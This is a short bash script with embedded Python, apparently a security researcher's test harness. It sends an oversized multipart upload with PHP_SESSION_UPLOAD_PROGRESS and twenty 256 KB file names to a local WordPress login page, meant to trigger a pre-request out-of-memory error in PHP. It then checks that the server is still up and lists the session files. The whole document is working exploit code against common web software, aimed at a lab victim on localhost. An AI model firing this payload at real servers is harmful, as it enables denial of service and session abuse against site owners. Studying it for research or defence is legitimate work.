#!/bin/bash
# Fire an rfc1867 ARM at the WP jammy victim; check for the pre-RINIT OOM
# signature (500 + "Allowed memory size exhausted ... in Unknown on line 0")
# and child survival.
set -u
URL=http://127.0.0.1:8080/wp-login.php
SID=wp0123456789abcdefghijklmnopqrstu
python3 - "$URL" "$SID" <<'PYEOF'
import socket, sys, time
url_path_host_port = ("127.0.0.1", 8080, "/wp-login.php")
sid = sys.argv[2]
BND = b"UctxUp2026"
def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"
body = part(b"PHPSESSID", sid.encode())
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
for i in range(20):
    fn = (f"f{i}-".encode() + b"N" * 262144)[:262144]
    body += part(f"upload{i}".encode(), b"Z", filename=fn)
body += b"--" + BND + b"--\r\n"
head = (f"POST /wp-login.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
s = socket.create_connection(("127.0.0.1", 8080), timeout=60)
s.sendall(head + body)
s.settimeout(60)
data = b""
while True:
    try:
        c = s.recv(65536)
    except Exception as e:
        data += f"\n<RECV {type(e).__name__}>".encode(); break
    if not c: break
    data += c
s.close()
first = data.split(b"\r\n",1)[0]
print("ARM status:", first.decode(errors="replace"))
print("exhausted-in-body:", b"exhausted" in data, "| Unknown-on-line-0:", b"in Unknown on line 0" in data)
PYEOF
sleep 1
echo "--- server alive check:"
curl -s -o /dev/null -w "front page: %{http_code}\n" --max-time 5 http://127.0.0.1:8080/
echo "--- session file state:"
ls -la /var/lib/php/sessions/ 2>/dev/null | tail -3
